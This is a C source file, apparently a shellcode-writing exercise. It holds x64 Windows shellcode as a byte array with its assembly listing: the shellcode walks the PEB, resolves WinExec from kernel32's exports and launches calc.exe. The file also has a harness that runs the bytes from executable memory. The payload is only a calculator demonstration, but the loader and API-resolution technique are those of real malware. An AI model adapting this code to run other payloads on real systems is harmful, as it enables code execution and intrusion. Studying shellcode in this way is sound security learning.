#include<stdio.h>
#include<Windows.h>

extern void pop_calc_shellcode();
typedef void(*execute_me)();

// assembled with https://defuse.ca/online-x86-assembler.htm#disassembly
char calc_shellcode[] = { 0x55, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x90, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8D, 0x40, 0xF0, 0x48, 0x8B, 0x40, 0x30, 0x48, 0x31, 0xDB, 0x8B, 0x58, 0x3C, 0x48, 0x01, 0xC3, 0x48, 0x81, 0xC3, 0x88, 0x00, 0x00, 0x00, 0x48, 0x31, 0xC9, 0x8B, 0x0B, 0x48, 0x01, 0xC1, 0x48, 0x89, 0x8D, 0x70, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xD2, 0x8B, 0x51, 0x1C, 0x48, 0x01, 0xC2, 0x48, 0x89, 0x55, 0x90, 0x48, 0x31, 0xDB, 0x8B, 0x51, 0x20, 0x48, 0x01, 0xC2, 0x48, 0x89, 0x55, 0xA0, 0x48, 0x31, 0xC9, 0x48, 0x31, 0xD2, 0x51, 0x48, 0xB9, 0xFF, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x48, 0xC1, 0xE9, 0x08, 0x51, 0x54, 0x48, 0x31, 0xC9, 0xB1, 0x07, 0x51, 0x41, 0x58, 0x41, 0x59, 0x4D, 0x31, 0xE4, 0x4C, 0x89, 0xC1, 0x4C, 0x89, 0xCE, 0x48, 0x8B, 0x55, 0xA0, 0x42, 0x8B, 0x14, 0xA2, 0x49, 0xFF, 0xC4, 0x4C, 0x8D, 0x1C, 0x02, 0x4C, 0x89, 0xDF, 0xF3, 0xA6, 0x75, 0xE4, 0x48, 0x83, 0xC4, 0x10, 0x49, 0xFF, 0xCC, 0x48, 0x31, 0xFF, 0x48, 0x31, 0xD2, 0xB2, 0x04, 0x48, 0x01, 0xD7, 0x50, 0x48, 0x89, 0xF8, 0x4C, 0x89, 0xE6, 0x48, 0xF7, 0xEE, 0x48, 0x89, 0xC6, 0x58, 0x48, 0x8B, 0x7D, 0x90, 0x48, 0x8D, 0x3C, 0x37, 0x8B, 0x3F, 0x48, 0x01, 0xC7, 0x48, 0xBB, 0x41, 0x41, 0x41, 0x41, 0x2E, 0x65, 0x78, 0x65, 0x48, 0xC1, 0xEB, 0x20, 0x53, 0x48, 0xBB, 0x6D, 0x33, 0x32, 0x5C, 0x63, 0x61, 0x6C, 0x63, 0x53, 0x48, 0xBB, 0x77, 0x73, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x53, 0x48, 0xBB, 0x43, 0x3A, 0x5C, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x53, 0x54, 0x59, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD7 };

void test_shellcode_bytes(char* shellcode, int length) {
	char* execBuffer = (char*)VirtualAlloc((LPVOID)NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!execBuffer) {
		printf("Trouble allocating memory for buffer\n");
	}
	memcpy_s(execBuffer, length, shellcode, length);
	execute_me runme = (execute_me*)execBuffer;
	runme();

}


int main(int argc, char** argv) {

	printf("\nRunning pop_calc_shellcode()\n");
	//test_shellcode_bytes(calc_shellcode, 0x112);
	pop_calc_shellcode();
	printf("\nEnd running\n");
	
	return 0;
}

/*
			push rbp
			mov rbp, rsp
			sub rsp, 0x90
			xor rax, rax
			mov rax, qword ptr gs:[0x30]
			mov rax, qword ptr [rax + 0x60]
			mov rax, qword ptr [rax + 0x18]
			mov rax, qword ptr [rax + 0x20]
			mov rax, [rax]
			mov rax, [rax]
			lea rax,  [rax-0x10]
			mov rax, qword ptr[rax+0x30]
			xor rbx, rbx
			mov ebx, dword ptr [rax + 0x3c]
			add rbx, rax
			add rbx, 0x88
			xor rcx, rcx
			mov ecx, dword ptr [rbx]
			add rcx, rax
			mov qword ptr [rbp-0x90], rcx
			xor rdx, rdx
			mov edx, dword ptr [rcx + 0x1c]
			add rdx, rax
			mov qword ptr [rbp-0x70], rdx
			xor rbx, rbx
			mov edx, dword ptr [rcx + 0x20]
			add rdx, rax
			mov qword ptr [rbp-0x60], rdx
			xor rcx, rcx
			xor rdx, rdx
			push rcx
			mov rcx, 0x636578456e6957FF
			shr rcx, 8
			push rcx
			push rsp
			xor rcx, rcx
			mov cl, 7
			push rcx
			pop r8
			pop r9
			xor r12, r12
			IterateAndCompareFunctionName:
				mov rcx, r8
				mov rsi, r9
				mov rdx, qword ptr [rbp-0x60]
				mov edx, dword ptr [rdx + r12*4]
				inc r12
				lea r11, [rdx+ rax]
				mov rdi, r11
				repe cmpsb
				jne IterateAndCompareFunctionName
			add rsp, 0x10
			dec r12
			xor rdi, rdi
			xor rdx, rdx
			mov dl, 4
			add rdi, rdx
			push rax
			mov rax, rdi
			mov rsi, r12
			imul rsi
			mov rsi, rax
			pop rax
			mov rdi, qword ptr [rbp-0x70]
			lea rdi, [rdi + rsi]
			mov edi, dword ptr [rdi]
			add rdi, rax
			mov rbx, 0x6578652e41414141
			shr rbx, 32
			push rbx
			mov rbx, 0x636c61635c32336d
			push rbx
			mov rbx, 0x65747379735c7377
			push rbx
			mov rbx, 0x6f646e69575c3a43
			push rbx
			push rsp
			pop rcx
			inc rdx
			sub rsp, 0x20
			call rdi
*/